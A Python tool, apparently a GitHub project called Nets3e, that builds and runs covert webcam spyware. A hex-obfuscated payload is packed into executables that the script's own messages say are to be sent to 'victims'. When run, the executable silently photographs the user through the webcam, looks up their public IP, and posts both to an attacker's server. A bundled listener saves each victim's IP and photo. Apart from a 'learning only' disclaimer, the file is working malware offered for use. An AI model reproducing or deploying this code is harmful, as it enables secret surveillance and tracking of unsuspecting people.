#!/usr/bin/python3
# @Мартин.
import asyncio,urllib.parse,re,base64,json,sys,textwrap,argparse,subprocess,socket
from loguru import logger

Version = "@Мартин. Nets3e Tool V1.1.1 for Windows"
Title = '''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo = f'''                                                                    
         ,--.                                 .--,-``-.               
       ,--.'|              ___               /   /     '.             
   ,--,:  : |            ,--.'|_            / ../        ;            
,`--.'`|  ' :            |  | :,'           \ ``\  .`-    '           
|   :  :  | |            :  : ' :  .--.--.   \___\/   \   :           
:   |   \ | :   ,---.  .;__,'  /  /  /    '       \   :   |   ,---.   
|   : '  '; |  /     \ |  |   |  |  :  /`./       /  /   /   /     \  
'   ' ;.    ; /    /  |:__,'| :  |  :  ;_         \  \   \  /    /  | 
|   | | \   |.    ' / |  '  : |__ \  \    `.  ___ /   :   |.    ' / | 
'   : |  ; .''   ;   /|  |  | '.'| `----.   \/   /\   /   :'   ;   /| 
|   | '`--'  '   |  / |  ;  :    ;/  /`--'  / ,,/  ',-    .'   |  / | 
'   : |      |   :    |  |  ,   /'--'.     /\ ''\        ; |   :    | 
;   |.'       \   \  /    ---`-'   `--'---'  \   \     .'   \   \  /  
'---'          `----'                         `--`-,,-'      `----'   
                                                                       
                Github==>https://github.com/MartinxMax
                {Version}'''

def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


def myIp():
    return socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)[0][4][0]


class mainServer():
    def __init__(self,args):
        if self.__checkValue__(args):
            asyncio.run(self.__run__())


    def __generatePayload__(self):
        result_release = True
        payload_release = self.__bytescode__.decode('utf-8').replace('@remote',base64.b64encode(self.rhost.encode("utf-8")).decode('utf-8')).encode('utf-8')
        payload_debug = self.__bytescode__.decode('utf-8').replace('@remote',base64.b64encode((f'http://{self.lhost}:{self.lport}').encode("utf-8")).decode('utf-8')).encode('utf-8')
        try:
            if self.rhost:
                with open('./temp_release.py', 'wb') as f:
                    f.write(payload_release)
            with open('./temp_debug.py', 'wb') as f:
                f.write(payload_debug)
        except Exception as e:
            pass
        else:
            logger.warning('Generating debug version (you can send this version to intranet victims)')
            result_debug = subprocess.call(f'pyinstaller -F ./temp_debug.py -n Nets3eClient_debug', shell=True,
                                           stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
            if self.rhost:
                logger.warning('Generating a release version (you can send it to public network victims)')
                result_release = subprocess.call(f'pyinstaller -F ./temp_release.py -n Nets3eClient_release', shell=True, stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)
            if not result_debug :
                if not result_release:
                    subprocess.call('del "./temp_release.py"', shell=True, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                subprocess.call('del "./temp_debug.py"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            else:
                logger.error('You can enter \'pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller\' to download the package')
                return False


    def __checkValue__(self,args):
        if not re.match(r'(?P<protocol>\w+):\/\/(?P<hostname>[\w\.]+)(:(?P<port>\d+))?\/?', args.RHOST) and args.RHOST:
            logger.error('\'-rh\' The remote address you entered is incorrect ! (example: http://xxx.xxx.xxx.xxx:10032)')
            return False
        elif not isinstance(args.LPORT, int):
            logger.error('\'-lp\' The local listening port number you entered is not an integer!')
            return False
        elif not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', args.LHOST):
            logger.error('\'-lh\' Incorrect local listening IP input ! (example: 192.x.x.x)')
            return False
        else:
            self.generate = args.GENERATE
            self.lport = args.LPORT
            self.lhost = args.LHOST
            self.rhost = args.RHOST
            self.__bytescode__= b'\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x0a\x69\x6d\x70\x6f\x72\x74\x20\x63\x76\x32\x0a\x69\x6d\x70\x6f\x72\x74\x20\x62\x61\x73\x65\x36\x34\x0a\x69\x6d\x70\x6f\x72\x74\x20\x6a\x73\x6f\x6e\x0a\x0a\x64\x65\x66\x20\x67\x65\x74\x5f\x69\x70\x28\x29\x3a\x0a\x20\x20\x20\x20\x74\x72\x79\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x64\x61\x74\x61\x20\x3d\x20\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x70\x6f\x73\x74\x28\x62\x61\x73\x65\x36\x34\x2e\x62\x36\x34\x64\x65\x63\x6f\x64\x65\x28\x27\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x47\x6b\x75\x61\x58\x41\x75\x63\x32\x49\x76\x61\x58\x41\x3d\x27\x29\x2e\x64\x65\x63\x6f\x64\x65\x28\x22\x75\x74\x66\x2d\x38\x22\x29\x2c\x20\x68\x65\x61\x64\x65\x72\x73\x3d\x7b\x27\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x27\x3a\x20\x27\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x27\x7d\x2c\x20\x74\x69\x6d\x65\x6f\x75\x74\x3d\x35\x29\x2e\x74\x65\x78\x74\x2e\x73\x74\x72\x69\x70\x28\x29\x0a\x20\x20\x20\x20\x65\x78\x63\x65\x70\x74\x20\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x20\x61\x73\x20\x65\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x4e\x6f\x6e\x65\x0a\x20\x20\x20\x20\x65\x6c\x73\x65\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x64\x61\x74\x61\x0a\x0a\x64\x65\x66\x20\x74\x61\x6b\x65\x5f\x70\x68\x6f\x74\x6f\x28\x29\x3a\x0a\x20\x20\x20\x20\x63\x61\x6d\x65\x72\x61\x5f\x64\x65\x76\x69\x63\x65\x20\x3d\x20\x30\x0a\x20\x20\x20\x20\x63\x61\x70\x20\x3d\x20\x63\x76\x32\x2e\x56\x69\x64\x65\x6f\x43\x61\x70\x74\x75\x72\x65\x28\x63\x61\x6d\x65\x72\x61\x5f\x64\x65\x76\x69\x63\x65\x29\x0a\x20\x20\x20\x20\x69\x66\x20\x6e\x6f\x74\x20\x63\x61\x70\x2e\x69\x73\x4f\x70\x65\x6e\x65\x64\x28\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x27\x27\x0a\x20\x20\x20\x20\x72\x65\x74\x2c\x20\x66\x72\x61\x6d\x65\x20\x3d\x20\x63\x61\x70\x2e\x72\x65\x61\x64\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x76\x61\x6c\x2c\x20\x62\x75\x66\x66\x65\x72\x20\x3d\x20\x63\x76\x32\x2e\x69\x6d\x65\x6e\x63\x6f\x64\x65\x28\x27\x2e\x6a\x70\x67\x27\x2c\x20\x66\x72\x61\x6d\x65\x29\x0a\x20\x20\x20\x20\x6a\x70\x67\x5f\x61\x73\x5f\x74\x65\x78\x74\x20\x3d\x20\x62\x61\x73\x65\x36\x34\x2e\x62\x36\x34\x65\x6e\x63\x6f\x64\x65\x28\x62\x75\x66\x66\x65\x72\x29\x2e\x64\x65\x63\x6f\x64\x65\x28\x27\x75\x74\x66\x2d\x38\x27\x29\x0a\x20\x20\x20\x20\x63\x61\x70\x2e\x72\x65\x6c\x65\x61\x73\x65\x28\x29\x0a\x20\x20\x20\x20\x63\x76\x32\x2e\x64\x65\x73\x74\x72\x6f\x79\x41\x6c\x6c\x57\x69\x6e\x64\x6f\x77\x73\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x27\x64\x61\x74\x61\x3a\x69\x6d\x61\x67\x65\x2f\x70\x6e\x67\x3b\x62\x61\x73\x65\x36\x34\x2c\x27\x20\x2b\x20\x6a\x70\x67\x5f\x61\x73\x5f\x74\x65\x78\x74\x0a\x0a\x0a\x64\x65\x66\x20\x72\x65\x6d\x6f\x74\x65\x5f\x73\x65\x72\x76\x65\x72\x28\x64\x61\x74\x61\x29\x3a\x0a\x20\x20\x20\x20\x65\x6e\x63\x6f\x64\x65\x64\x20\x3d\x20\x62\x61\x73\x65\x36\x34\x2e\x62\x36\x34\x65\x6e\x63\x6f\x64\x65\x28\x64\x61\x74\x61\x2e\x65\x6e\x63\x6f\x64\x65\x28\x27\x75\x74\x66\x2d\x38\x27\x29\x29\x2e\x64\x65\x63\x6f\x64\x65\x28\x27\x75\x74\x66\x2d\x38\x27\x29\x0a\x20\x20\x20\x20\x74\x72\x79\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x70\x6f\x73\x74\x28\x62\x61\x73\x65\x36\x34\x2e\x62\x36\x34\x64\x65\x63\x6f\x64\x65\x28\x27\x40\x72\x65\x6d\x6f\x74\x65\x27\x29\x2e\x64\x65\x63\x6f\x64\x65\x28\x22\x75\x74\x66\x2d\x38\x22\x29\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x68\x65\x61\x64\x65\x72\x73\x3d\x7b\x27\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x27\x3a\x20\x27\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x27\x7d\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x74\x69\x6d\x65\x6f\x75\x74\x3d\x31\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x64\x61\x74\x61\x3d\x65\x6e\x63\x6f\x64\x65\x64\x29\x0a\x20\x20\x20\x20\x65\x78\x63\x65\x70\x74\x20\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x20\x61\x73\x20\x65\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x70\x61\x73\x73\x0a\x0a\x0a\x64\x65\x66\x20\x6d\x61\x69\x6e\x28\x29\x3a\x0a\x20\x20\x20\x20\x69\x70\x20\x3d\x20\x67\x65\x74\x5f\x69\x70\x28\x29\x0a\x20\x20\x20\x20\x69\x66\x20\x69\x70\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x73\x6f\x6e\x5f\x73\x74\x72\x20\x3d\x20\x6a\x73\x6f\x6e\x2e\x64\x75\x6d\x70\x73\x28\x7b\x27\x49\x50\x27\x3a\x20\x69\x70\x2c\x20\x27\x50\x68\x6f\x74\x6f\x27\x3a\x20\x74\x61\x6b\x65\x5f\x70\x68\x6f\x74\x6f\x28\x29\x7d\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x6d\x6f\x74\x65\x5f\x73\x65\x72\x76\x65\x72\x28\x6a\x73\x6f\x6e\x5f\x73\x74\x72\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x54\x72\x75\x65\x0a\x20\x20\x20\x20\x65\x6c\x73\x65\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x46\x61\x6c\x73\x65\x0a\x0a\x0a\x69\x66\x20\x5f\x5f\x6e\x61\x6d\x65\x5f\x5f\x20\x3d\x3d\x20\x27\x5f\x5f\x6d\x61\x69\x6e\x5f\x5f\x27\x3a\x0a\x20\x20\x20\x20\x6d\x61\x69\x6e\x28\x29'
            return True


    def __saveLog__(self,ip, photo):
        with open("./IP_Photo/" + ip + ".txt", 'w', encoding='utf-8') as f:
            f.write(photo)
        logger.info(f"The victim {ip} information has been saved!")


    async def handleClient(self,reader, writer):
        data = b''
        while True:
            message = await reader.read(20480)
            if not message:
                break
            data += message
            await writer.drain()
        writer.close()
        try:
            data = data.decode('utf-8').split('\r\n\r\n')[-1].strip()
            data = base64.b64decode(data).decode('utf-8')
            data = json.loads(data)
        except Exception as f:
            pass
        else:
            if data['IP'] and data['Photo']:
                    self.__saveLog__(data['IP'], data['Photo'])


    async def __run__(self):
        if self.generate:
            logger.info('PAYLOAD Build...')
            if self.__generatePayload__():
                logger.info('The PAYLOAD construction was successful, and the directory is located in ./dist/')
            else:
                logger.error('PAYLOAD construction failed!!!')
        server = await asyncio.start_server(self.handleClient, '', self.lport)
        server.sockets[0].getsockname()
        logger.info(f"Server Runing....[IP:{self.lhost}:{self.lport}]")
        async with server:
            await server.serve_forever()


if __name__ == '__main__':
    Init_Loger()
    print(Logo,Title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {nets3e} -lh {ip} -lp 10032 # local listen port
                python3 {nets3e} -rh http://www.xxx.com:9999 -lp 10032 # remote host,local listen port
                python3 {nets3e} -rh http://www.xxx.com:9999 -g # Generate PAYLOAD
                '''.format(nets3e=sys.argv[0],ip=myIp()
                           )))
    parser.add_argument('-lh', '--LHOST',default=myIp(), help='Listen_Port')
    parser.add_argument('-lp', '--LPORT',type=int,default='10032', help='Listen_Port')
    parser.add_argument('-rh', '--RHOST', default='', help='Remote Host')
    parser.add_argument('-g', '--GENERATE', action='store_true', help='Biulding Payload')
    args = parser.parse_args()
    mainServer(args)